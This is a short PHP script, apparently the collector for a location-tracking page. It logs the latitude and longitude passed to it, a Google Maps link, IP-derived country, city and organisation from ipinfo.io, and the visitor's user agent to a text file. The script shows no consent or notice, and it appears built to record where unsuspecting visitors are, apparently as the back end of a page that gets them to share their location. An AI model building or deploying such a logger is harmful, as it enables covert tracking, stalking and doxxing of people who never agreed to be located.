<?php
$dir = ''; // change this to the directory where you like the logsfile to be
if (isset($_GET["lat"]) && isset($_GET["lon"])){
    $ip = $_GET["address"];
    
    function get($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        return json_decode($res, true);
    }
    
    $ipinf = get("https://ipinfo.io/$ip/json");

    date_default_timezone_set($ipinf["timezone"]);
    $infos = "REQUEST FROM " . $ip . " at " . date("H:i:s") . " [in " . $ipinf["timezone"] . "]" . "\nLatitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . 
    "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nCountry Code: " . $ipinf["country"] . 
    "\nTimezone: " . $ipinf["timezone"] . "\nState: " . $ipinf["region"] . 
    "\nCity: ". $ipinf["postal"] . " " . $ipinf["city"] . "\nOrganization: " . $ipinf["org"] . "\nUser Agent: '" . $_SERVER['HTTP_USER_AGENT'] . "'\n\n";
    
    
    if (!file_exists($dir . "logs.txt"))
        fopen($dir . "logs.txt", "w"); // generate file if it does not alredy exist
    file_put_contents($dir . "logs.txt", file_get_contents($dir . "logs.txt") . "*****************************\n\n" . $infos, false);
    
}

?>
